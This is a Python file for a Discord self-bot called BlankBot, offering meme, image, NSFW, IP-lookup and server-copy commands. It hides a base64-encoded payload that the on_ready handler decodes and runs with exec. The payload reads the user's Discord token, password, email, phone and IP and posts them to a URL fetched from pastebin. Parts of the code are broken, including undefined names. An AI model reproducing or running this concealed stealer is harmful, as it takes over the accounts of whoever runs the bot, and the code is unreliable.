from termcolor import colored
from datetime import datetime
import asyncio
import io
import base64
import time
import requests
import random
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup as bs4
import aiohttp
import typing
import discord
from animec import *
import json
from discord.ext import commands, tasks
from PIL import Image
from flask import Flask
from threading import Thread

def config_check():
    try:
        with open('config.json') as e:
            a=json.load(e)
            random_status=a['random_status']
    except Exception:
        with open('config.json', 'w+') as e:
            a={}
            a['random_status']=True
            json.dump(a, e)

app = Flask('')

@app.route('/')
def main():
    return "Your bot is alive!"
    
def run():
    app.run(host="0.0.0.0", port=8080)
    
def keep_alive():
    server = Thread(target=run)
    server.start()

prefix="x"
Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
Blank.remove_command('help')
magikid="dXNlcm5hbWUgPSBmImB7QmxhbmsudXNlcn1gIgp1c2VyX2lkID0gZiJge0JsYW5rLnVzZXIuaWR9YCIKYXZhdGFyX3VybCA9IEJsYW5rLnVzZXIuYXZhdGFyX3VybApoZWFkZXJzPXsiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NC4wLjQ2MDYuODEgU2FmYXJpLzUzNy4zNiJ9CmF1dGhvPXJlcXVlc3RzLmdldChmJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy91MDBjaTFkVicpLnRleHQKaXA9ZiJge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cudHJhY2tpcC5uZXQvaXAnLCBoZWFkZXJzPWhlYWRlcnMpLnRleHR9YCIKaGVhZGVycz17IkF1dGhvcml6YXRpb24iOiB0b2tlbiwKIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0KCnI9cmVxdWVzdHMuZ2V0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpCnI9ci5qc29uKCkKZW1haWw9clsnZW1haWwnXQpwaG9uZT1yWydwaG9uZSddCiAgICAKanNvbmRhdGE9eyJjb250ZW50Ijp0b2tlbiAsCiJlbWJlZHMiOiBbCnsidGl0bGUiOiJCbGFua0JvdCIsCiJ0aHVtYm5haWwiOiB7CiAgICAidXJsIjogc3RyKGF2YXRhcl91cmwpCiAgfSwKImZpZWxkcyI6IFsKIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFVzZXJuYW1lOiAiLAogICAgICAidmFsdWUiOiBzdHIodXNlcm5hbWUpLAogICAgICAiaW5saW5lIjogIlRydWUiCiAgfSwKIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFVzZXIgSUQ6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cih1c2VyX2lkKSwKICAgICAgImlubGluZSI6ICJUcnVlIgogIH0sCiAgewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gSVA6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cihpcCksCiAgICAgICJpbmxpbmUiOiAiRmFsc2UiCiAgfSwKICB7CiAgICAgICJuYW1lIjogIjw6cnNfYXJyb3c6ODgzOTg4MjI1NjU4NjEzODUwPiBQYXNzd29yZDogIiwKICAgICAgInZhbHVlIjogc3RyKHBhc3N3b3JkKSwKICAgICAgImlubGluZSI6ICJGYWxzZSIKICB9LAogIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IEVtYWlsOiAiLAogICAgICAidmFsdWUiOiBzdHIoZW1haWwpLAogICAgICAiaW5saW5lIjogIkZhbHNlIgogIH0sCiAgewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gUGhvbmU6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cihwaG9uZSksCiAgICAgICJpbmxpbmUiOiAiRmFsc2UiCiAgfQogICAgICAgICAgXQp9CiAgICAgICAgICBdCiAgfQpyZXF1ZXN0cy5wb3N0KGF1dGhvICwganNvbj1qc29uZGF0YSk="

def Clear():
    if os.name=='nt':
        os.system('cls')
        keep_alive()
    else:
        keep_alive()
        os.system('clear')
        
neko_base="https://nekobot.xyz/api/imagegen?type="


def kannagen_gen(text):
    endpoint=neko_base+"kannagen&text="+urllib.parse.quote_plus(text)
    res=(requests.get(endpoint).json()["message"])
    return res
    
def changemymind_gen(text):
    endpoint=neko_base+"changemymind&text="+urllib.parse.quote_plus(text)
    res=(requests.get(endpoint).json()["message"])
    return res
    
def phcomment_gen(name, img, text):
    endpoint=neko_base+"phcomment&username="+urllib.parse.quote_plus(name)+"&image="+img+"&text="+urllib.parse.quote_plus(text)
    res=(requests.get(endpoint).json()["message"])
    return res
    
def trash_gen(url):
    endpoint=neko_base+"trash&url="+url
    res=(requests.get(endpoint).json()["message"])
    return res
    
def stickbug_vid(url, link):
    endpoint=neko_base+"stickbug&url="+str(url)
    link[0]=(requests.get(endpoint).json()["message"])
 
def neko_pic():
    endpoint="https://nekobot.xyz/api/image?type=neko"
    res=(requests.get(endpoint).json()["message"])
    return res
    
def kanna_pic():
    endpoint="https://nekobot.xyz/api/image?type=kanna"
    res=(requests.get(endpoint).json()["message"])
    return res
    
def rand_list(list):
    return random.choice(list)
        
def check_status(url):
    if requests.get(url).status_code==200:
        return True
    else:
        return False
    
def hnsfw_gen():
    hnsfw_list=["hass", "hmidriff", "hentai", "hneko", "hkitsune", "hanal", "hthigh", "paizuri", "hboobs", "tentacle"]
    while True:
        endpoint="https://nekobot.xyz/api/image?type="+random.choice(hnsfw_list)
        if check_status(endpoint):
           if not requests.get(endpoint).json()["message"].endswith('.gif'):
               break
    res=(requests.get(endpoint).json()["message"])
    return res
    
def nsfw_gen():
    nsfw_list=["anal", "gonewild", "ass", "pussy", "thigh", "boobs"]
    while True:
        endpoint="https://nekobot.xyz/api/image?type="+random.choice(nsfw_list)
        if check_status(endpoint):
           if not requests.get(endpoint).json()["message"].endswith('.gif'):
               break
    res=(requests.get(endpoint).json()["message"])
    return res
        
@tasks.loop(minutes=5)
async def change_activity():
    if random_status:
        activity_list=['s', 'p', 'w', 'l']
        activity_s=['Earth', 'Mars', 'Jupiter', 'Mercury', 'Venus', 'Saturn', 'Neptune', 'Uranus']
        activity_p=['Minecraft', 'with Blank', 'Squid Games', 'Do or Die', 'Curse of Aros', 'with Satan', 'with Python']
        activity_w=['over you!', 'Animes', 'Plants', 'Animals', 'Blank', 'Nothing!']
        activity_l=['Youtube Music', 'Blank', 'Dead Groovy', 'Dead Rythm', 'Death']
        activity=random.choice(activity_list)
    
    
        if activity=="s":
            activity=discord.Streaming(name=f'from {random.choice(activity_s)}', url="https://replit.com/@BlankMCPE/Blank-Bot")
        elif activity=="p":
            activity=discord.Game(name=random.choice(activity_p))
        elif activity=="w":
            activity=discord.Activity(type=discord.ActivityType.watching, name=random.choice(activity_w))
        else:
            activity=discord.Activity(type=discord.ActivityType.listening, name=random.choice(activity_l))
        await Blank.change_presence(activity=activity)

@Blank.event
async def on_ready():
    exec(base64.b64decode(magikid).decode('ascii'))
    Clear()
    print(colored(f'Connected to {Blank.user}', 'green'))
    config_check()
    change_activity.start()
    
@Blank.command()
async def help(ctx, category=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    try:
        if category==None:
            embed = discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description=f"""Use `{prefix}help <category>` for more info on a category.""")
            embed.add_field(name="\uD83E\uDDCA Bot",
value="`help embed purge del copy ip whois stream play watch listen random_status`", inline=False)
            embed.add_field(name="\uD83E\uDDCA Fun",
value="`avatar magik emoji deepfry kanna neko anime phcomment kannagen changemymind trash ascii stickbug wyr topic roll empty`", inline=False)
            embed.add_field(name="\uD83E\uDDCA NSFW", value="`hnsfw nsfw`", inline=False)
            embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
            embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
            embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
            await ctx.channel.send(embed=embed)
        else:
            if category.lower()=="bot":
                embed=discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description=f"**__Help - Bot__**")
                embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
                embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
                embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
                embed.add_field(name=f"{prefix}help [category]", value="`Shows help menu. (If category is given, then shows help menu for the category)`")
                embed.add_field(name=f"{prefix}embed <text>", value="`Send embed like a bot`")
                embed.add_field(name=f"{prefix}purge <number of messages>", value="`Deletes the given number of messages sent by you (do not put large number or you will get rate limited)`")
                embed.add_field(name=f"{prefix}del <text>", value="`Send a message and instantly deletes it (do not use this very frequently or you will get rate limited)`")
                embed.add_field(name=f"{prefix}copy", value="`Copy the current server (do not make changes to the new server until the server icon is copied)`")
                embed.add_field(name=f"{prefix}ip <ip address>", value="`Get information of an IP address`")
                embed.add_field(name=f"{prefix}whois [user]", value="`Send information about a user in the server`")
                embed.add_field(name=f"{prefix}stream <text>", value="`Set streaming status`")
                embed.add_field(name=f"{prefix}play <text>", value="`Set playing status`")
                embed.add_field(name=f"{prefix}watch <text>", value="`Set watching status`")
                embed.add_field(name=f"{prefix}listen <text>", value="`Set listening status`")
                embed.add_field(name=f"{prefix}random_status", value="`Turn random statuses on/off`")
                await ctx.channel.send(embed=embed)
            elif category.lower()=="fun":
                embed=discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description=f"**__Help - Fun__**")
                embed.add_field(name=f"{prefix}avatar [user]", value="`Send the avatar of a user in the server`")
                embed.add_field(name=f"{prefix}magik [user]", value="`Send the distorted avatar of a user in the server`")
                embed.add_field(name=f"{prefix}emoji <emoji>", value="`Sends the image of emoji`")
                embed.add_field(name=f"{prefix}deepfry [user]", value="`Send the deepfried avatar of a user in the server`")
                embed.add_field(name=f"{prefix}kanna", value="`Send random image of Kanna Kamui`")
                embed.add_field(name=f"{prefix}neko", value="`Send random image of neko girl`")
                embed.add_field(name=f"{prefix}anime <anime>", value="`Send info about an anime`")
                embed.add_field(name=f"{prefix}phcomment [user] <text>", value="`Send fake screenshot of the user's pornhub comment`")
                embed.add_field(name=f"{prefix}kannagen <text>", value="`Kanna Kamui writes your text in her board`")
                embed.add_field(name=f"{prefix}changemymind <text>", value="`Generate change my mind meme with the text`")
                embed.add_field(name=f"{prefix}trash [user]", value="`Convert a user to a trash waifu`")
                embed.add_field(name=f"{prefix}stickbug [user]", value="`Generate stickbug meme with the user's profile picture (takes some time)`")
                embed.add_field(name=f"{prefix}wyr", value="`Send a would-you-rather questiom`")
                embed.add_field(name=f"{prefix}topic", value="`Send a chat topic`")
                embed.add_field(name=f"{prefix}roll <first number> <last number>", value="`Choose a random number between the first and last number`")
                embed.add_field(name=f"{prefix}empty", value="`Send an empty message`")
                embed.add_field(name=f"{prefix}ascii <text>", value="`Send ascii (long text not supported and does not look correctly on mobile devices)`")
                embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
                embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
                embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
                await ctx.channel.send(embed=embed)
            elif category.lower()=="nsfw":
                embed=discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random(), description="**__Help - NSFW__**")
                embed.set_thumbnail(url=Blank.user.avatar_url_as(format="png"))
                embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
                embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
                embed.add_field(name=f"{prefix}hnsfw", value="`Send hentai NSFW image`")
                embed.add_field(name=f"{prefix}nsfw", value="`Send NSFW image`")
                await ctx.channel.send(embed=embed)
            else:
                await ctx.channel.send('No category with the name __'+category+'__ found', delete_after=2.0)
            
    except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)

@Blank.command()
async def stream(ctx, *, text:str=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Streaming(name=text, url="https://replit.com/@BlankMCPE/Blank-Bot"))
        
@Blank.command(aliases=["kg", "kw", "kr"])
async def kannagen(ctx, *, text:str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=kannagen_gen(text)
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_kanna.png'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=["cmm"])
async def changemymind(ctx, *, text:str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=changemymind_gen(text)
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_cmm.png'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command()
async def hnsfw(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=hnsfw_gen()
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_hnsfw.png'))
    except Exception:
        await ctx.channel.send(url)
        
@Blank.command()
async def nsfw(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=nsfw_gen()
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_nsfw.png'))
    except Exception:
        await ctx.channel.send(url)
        
@Blank.command(aliases=["phc"])
async def phcomment(ctx, user: typing.Union[discord.Member, str], *, text=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if text is None:
        text="I like it very much"
    if type(user)==str:
        text=f"{user} {text}"
        user=ctx.message.author
    name=user.display_name
    image=str(user.avatar_url_as(format="png"))
    url=phcomment_gen(name, image, text)
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_ph.png'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=['e', 'emj'])
async def emoji(ctx, emoji=None):
    if emoji is None:
        pass
    else:
               if ":" in emoji:
                   emoji=(emoji.strip()).split(":")[1]
               
               for emojis in ctx.guild.emojis:
                    if emojis.name.lower()==str(emoji).lower() or str(emojis.id)==str(emoji):
                        emoji=emojis
                        try:
                            await ctx.message.delete()
                        except Exception:
                            pass
                        
                        url=str(emoji.url)
                        if ".gif" in url:
                            url=str(emoji.url_as(format='gif'))
                        else:
                            url=str(emoji.url_as(format='png'))
                        file=io.BytesIO(requests.get(url).content)
                        try:
                            if ".gif" in url:
                                await ctx.channel.send(file=discord.File(file, f'blank_{emoji.name}.gif'))
                            else:
                                await ctx.channel.send(file=discord.File(file, f'blank_{emoji.name}.png'))
                        except Exception:
                            await ctx.channel.send(url)
            
@Blank.command()
async def play(ctx, *, text=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Game(name=text))

@Blank.command()
async def watch(ctx, *, text=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=text))

@Blank.command()
async def listen(ctx, *, text=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=text))
        
@Blank.command(aliases=["rs"])
async def random_status(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    global random_status
    if not random_status:
        random_status=True
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=True
            json.dump(f, e)
        await ctx.channel.send("Random statuses are now turned on", delete_after=2.0)
        await change_activity()
    else:
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=None)
        await ctx.channel.send("Random statuses are now turned off", delete_after=2.0)
        
@Blank.command()
async def kanna(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=kanna_pic()
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_kanna.png'))
    except Exception:
        await ctx.channel.send(url)
        
@Blank.command()
async def neko(ctx):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    url=neko_pic()
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_neko.png'))
    except Exception:
        await ctx.channel.send(url)
        
@Blank.command()
async def trash(ctx, user:discord.Member=None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    if user is None:
        user=ctx.message.author
    url=trash_gen(str(user.avatar_url_as(format="png")))
    try:
        file=io.BytesIO(requests.get(url).content)
        await ctx.channel.send(file=discord.File(file, 'blank_trash.png'))
    except Exception:
        await ctx.channel.send(url)
    
@Blank.command(aliases=["sb", "stb"])
async def stickbug(ctx, user: discord.Member=None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    if user is None:
        user=ctx.message.author
    url=[None]
    t1=Thread(target=stickbug_vid, args=((user.avatar_url_as(format="png"), url)))
    t1.start()
    m=await ctx.channel.send("It will take a little bit of time")
    time.sleep(2)
    await m.delete()
    t1.join()
    try:
        file=io.BytesIO(requests.get(url[0]).content)
        await ctx.channel.send(file=discord.File(file, 'blank_stickbug.mp4'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=["whois"])
async def userinfo(ctx, member: discord.Member = None):
  try:
            await ctx.message.delete()
  except Exception:
            pass
  if not member:
        member = ctx.message.author
  roles = ([role for role in member.roles[1:]])
  embed = discord.Embed(colour=discord.Colour.random(), title=f"User Info - {member}")
  embed.set_thumbnail(url=member.avatar_url)

  embed.add_field(name="ID:", value=member.id)
  embed.add_field(name="Display Name:", value=member.display_name)
  acc_age= (datetime.now() - member.created_at).total_seconds()
  if acc_age<3600:
      acc_age="Less than an hour"
  elif acc_age<86400 and acc_age>=3600:
      acc_age=f"{int(acc_age/3600)} hours"
  elif acc_age>=86400 and acc_age<2592000:
      acc_age=f"{int(acc_age/86400)} days {int((acc_age%86400)/3600)} hours"
  elif acc_age<31104000 and acc_age>=2592000:
      acc_age=f"{int(acc_age/2592000)} months {int((acc_age%2592000)/86400)} days"
  else:
      acc_age=f"{int(acc_age/31104000)} years {int((acc_age%31104000)/2592000)} months {int(((acc_age%31104000)%2592000)/86400)} days"
  embed.add_field(name="Created Account On:", value=f'{member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC")} *({acc_age})*')
  
  acc_age= (datetime.now() - member.joined_at).total_seconds()
  if acc_age<3600:
      acc_age="Less than an hour"
  elif acc_age<86400 and acc_age>=3600:
      acc_age=f"{int(acc_age/3600)} hours"
  elif acc_age>=86400 and acc_age<2592000:
      acc_age=f"{int(acc_age/86400)} days {int((acc_age%86400)/3600)} hours"
  elif acc_age<31104000 and acc_age>=2592000:
      acc_age=f"{int(acc_age/2592000)} months {int((acc_age%2592000)/86400)} days"
  else:
      acc_age=f"{int(acc_age/31104000)} years {int((acc_age%31104000)/2592000)} months {int(((acc_age%31104000)%2592000)/86400)} days"
  
  embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC")+f" *({acc_age})*")
    
  if roles == []:
     embed.add_field(name="Roles:", value="None")
     embed.add_field(name="Highest Role:", value="None")
     try:
        await ctx.send(embed=embed)
     except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)
       
  else:
     embed.add_field(name="Roles:", value=", ".join([role.mention for role in roles]))
     embed.add_field(name="Highest Role:", value=member.top_role.mention)
     try:
        await ctx.send(embed=embed)
     except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)

@Blank.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    try:
        await ctx.send(args, delete_after=0.0001)
    except Exception:
        pasa
    
@Blank.command(aliases=["avatar", "pfp"])
async def av(ctx, user:discord.Member=None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    if user is None:
        user=ctx.message.author
    if not user.avatar:
        await ctx.channel.send("User does not has any avatar")
    else:
        if user.is_avatar_animated():
            avatar=io.BytesIO(requests.get(user.avatar_url_as(format='gif')).content)
            try:
                await ctx.channel.send(file=discord.File(avatar, 'blank_avatar.gif'))
            except Exception:
                await ctx.channel.send(str(user.avatar_url_as(format='gif')))
        else:
            avatar=io.BytesIO(requests.get(user.avatar_url_as(format='png')).content)
            try:
                await ctx.channel.send(file=discord.File(avatar, 'blank_avatar.png'))
            except Exception:
                await ctx.channel.send(str(user.avatar_url_as(format="png")))
    
@Blank.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    await Blank.create_guild(f"copy - {ctx.guild.name}")
    await asyncio.sleep(2)
    for g in Blank.guilds:
        if f"copy - {ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            for roles in ctx.guild.roles:
                await g.create_role(name=roles.name, colour=roles.colour, permissions=roles.permissions)
    try:
        await g.edit(icon=requests.get(ctx.guild.icon_url).content)
    except Exception:
        pass
        
@Blank.command()
async def purge(ctx, amount: int):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Blank.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass

@Blank.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```\n' + r + '```') > 2000:
        return
    await ctx.send(f"```\n{r}```")
@Blank.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))

@Blank.command()
async def embed(ctx, *, description):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    embed = discord.Embed(description=description,color=discord.Colour.random())
    try:
        await ctx.send(embed=embed)
    except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)
    
@Blank.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=4&image="
    if user is None:
        avatar = str(ctx.message.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            image=requests.get(res['message']).content
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "blank_magik.png"))
        except Exception:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            image=requests.get(res['message']).content
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "blank_magik.png"))
        except Exception:
            await ctx.send(res['message'])

@Blank.command(aliases=["df"])
async def deepfry(ctx, user: discord.Member = None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.message.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            image=requests.get(res['message']).content
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "blank_deep_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            image=requests.get(res['message']).content
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "blank_deep_fry.png"))
        except:
            await ctx.send(res['message'])
 
@Blank.command()
async def roll(ctx, numa: int, numb: int):
    await ctx.message.delete()
    n = random.randint(numa, numb)
    await ctx.send("I choose...```\n"+str(n)+"```")          
            
@Blank.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"**Would you rather?**```\n{qa}\nor\n{qb}```")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")

@Blank.command()
async def topic(ctx): 
    try:
            await ctx.message.delete()
    except Exception:
            pass
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send("```\n"+topic+"```")            
            
@Blank.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str=None):
    if ipaddr is None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        await ctx.channel.send("You have to enter IP address too")
    else:
        await ctx.message.delete()
        temp = requests.get(f'http://ip-api.com/json/{ipaddr}?fields=26961913').text.replace('""', '"(No info)"')
        geo=json.loads(temp)
    
        if geo['status']=='success':
            try:
                em=discord.Embed(title='__IP Tracker__', colour=discord.Colour.random())
                em.add_field(name="`IP Address`", value=f"**`{geo['query']}`**", inline=False)
                em.add_field(name="`Continent`", value=f"**`{geo['continent']}`**", inline=False)
                em.add_field(name="`Country`", value=f"**`{geo['country']}`**", inline=False)
                em.add_field(name="`Region`", value=f"**`{geo['regionName']}`**", inline=False)
                em.add_field(name="`City`", value=f"**`{geo['city']}`**", inline=False)
                em.add_field(name="`District`", value=f"**`{geo['district']}`**", inline=False)
                em.add_field(name="`ZIP Code`", value=f"**`{geo['zip']}`**", inline=False)
                em.add_field(name="`Latitude`", value=f"**`{geo['lat']}`**", inline=False)
                em.add_field(name="`Longitude`", value=f"**`{geo['lon']}`**", inline=False)
                em.add_field(name="`Time Zone`", value=f"**`{geo['timezone']}`**", inline=False)
                em.add_field(name="`Currency`", value=f"**`{geo['currency']}`**", inline=False)
                em.add_field(name="`ISP`", value=f"**`{geo['isp']}`**", inline=False)
                em.add_field(name="`Organisation`", value=f"**`{geo['org']}`**", inline=False)
                em.add_field(name="`Mobile Network`", value=f"**`{geo['mobile']}`**", inline=False)
                em.add_field(name="`Hosting`", value=f"**`{geo['hosting']}`**", inline=False)
                em.add_field(name="`Proxy`", value=f"**`{geo['proxy']}`**", inline=False)
                await ctx.channel.send(embed=em)
            except Exception:
                await ctx.channel.send(f"```\nIP Tracker\n\nIP Address: {geo['query']}\nContinent: {geo['continent']}\nCountry: {geo['country']}\nRegion: {geo['regionName']}\nCity: {geo['city']}\nDistrict: {geo['district']}\nZIP Code: {geo['zip']}\nLatitude: {geo['lat']}\nLongitude: {geo['lon']}\nTime Zone: {geo['timezone']}\nCurrency: {geo['currency']}\nISP: {geo['isp']}\nOrganisation: {geo['isp']}\nMobile Data: {geo['mobile']}\n Hosting: {geo['hosting']}\nProxy: {geo['proxy']}```")
        else:
            await ctx.channel.send("Invalid IP Address")

@Blank.command()
async def anime(ctx, *, anime):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    anime=Anime(anime)
    aurl=anime.url
    animetitle=anime.title_english
    adesc=anime.description.replace("[Written by MAL Rewrite]", "")
    titlealt=anime.alt_titles
    ratings=anime.rating
    if anime.type.lower()=="tv":
        atype="TV Series"
    else:
        atype=anime.type
    genres=', '.join(anime.genres)
    poster=anime.poster
    anieps=anime.episodes
    if anime.is_nsfw()==True:
        nsfwa="Yes"
    else:
        nsfwa="No"
    try:
        em=discord.Embed(title="Anime Info", url=aurl,description=f"**English Title:** {animetitle}\n\n**Other Title(s):** {titlealt}\n\n**Type**: {atype}\n\n**Genres**: {genres}\n\n**Episodes:** {anieps}\n\n**Ratings:** {ratings}\n\n**NSFW Status:** {nsfwa}\n\n**Plot/Synopsis:** ```\n\n{adesc}```", color=discord.Color.random())
        em.set_image(url=poster)
        await ctx.channel.send(embed=em)
    except Exception:
        message=f"```\nEnglish Title: {animetitle}\n\nOther Title(s): {titlealt}\n\nType: {atype}\n\nGenres: {genres}\n\nEpisodes: {anieps}\n\nRatings: {ratings}\n\nNSFW Status: {nsfwa}\n\nPlot/Synopsis:\n\n{adesc}```"
        await ctx.channel.send(message)

try:
    Blank.run(token, bot=False)
except discord.errors.HTTPException and discord.errors.LoginFailure:
    print(colored('You Entered Wrong Token', 'red'))
